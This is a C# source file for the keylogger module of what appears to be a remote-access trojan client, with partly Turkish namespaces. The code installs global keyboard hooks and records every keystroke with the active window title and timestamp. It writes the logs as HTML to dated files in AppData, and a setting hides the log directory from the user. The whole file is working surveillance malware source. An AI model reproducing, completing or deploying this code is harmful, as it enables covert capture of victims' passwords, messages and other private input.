using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using xClient.Ayarlar;
using Timer = System.Timers.Timer;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.MouseKeyHook;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Utilityler
{
    public class Keylogger : IDisposable
    {
        public static Keylogger Instance;

        public bool IsDisposed { get; private set; }

        public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Settings.LOGDIRECTORYNAME); } }

        private readonly Timer _timerFlush;
        private StringBuilder _logFileBuffer;
        private List<Keys> _pressedKeys = new List<Keys>();
        private List<char> _pressedKeyChars = new List<char>();
        private string _lastWindowTitle;
        private bool _ignoreSpecialKeys;
        private KlavyeFareEylemleri _mEvents;

        public Keylogger(double flushInterval)
        {
            Instance = this;
            _lastWindowTitle = string.Empty;
            _logFileBuffer = new StringBuilder();

            Subscribe(AnaHook.GlobalEvents());

            _timerFlush = new Timer { Interval = flushInterval };
            _timerFlush.Elapsed += timerFlush_Elapsed;
            _timerFlush.Start();

            WriteFile();
        }


        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!IsDisposed)
            {
                if (disposing)
                {
                    if (_timerFlush != null)
                    {
                        _timerFlush.Stop();
                        _timerFlush.Dispose();
                    }
                }

                Unsubscribe();

                IsDisposed = true;
            }
        }

        private void Subscribe(KlavyeFareEylemleri events)
        {
            _mEvents = events;
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
            _mEvents.Dispose();
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = KeyloggerHelper.GetActiveWindowTitle(); 
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
                    + KeyloggerHelper.Filter(activeWindowTitle) + " - "
                    + DateTime.Now.ToString("HH:mm")
                    + "</b>]</p><br>");
            }

            if (_pressedKeys.IsModifierKeysSet())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !KeyloggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = KeyloggerHelper.Filter(e.KeyChar);
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (_pressedKeys.IsModifierKeysSet())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e) 
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = KeyloggerHelper.GetDisplayName(keys[i]);
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.IsModifierKeysSet())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0 && !KuuhakuClient.Exiting)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string filename = Path.Combine(LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(LogDirectory);

                if (!di.Exists)
                    di.Create();

                if (Settings.HIDELOGDIRECTORY)
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                if (!File.Exists(filename))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile.Append(
                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                        DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");

                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");

                    _lastWindowTitle = string.Empty;
                }

                if (_logFileBuffer.Length > 0)
                {

                    logFile.Append(_logFileBuffer);
                }

                DosyaYardımcısı.LogDosyasıYaz(filename, logFile.ToString());

                logFile.Clear();
            }
            catch
            {
            }

            _logFileBuffer.Clear();
        }
    }
}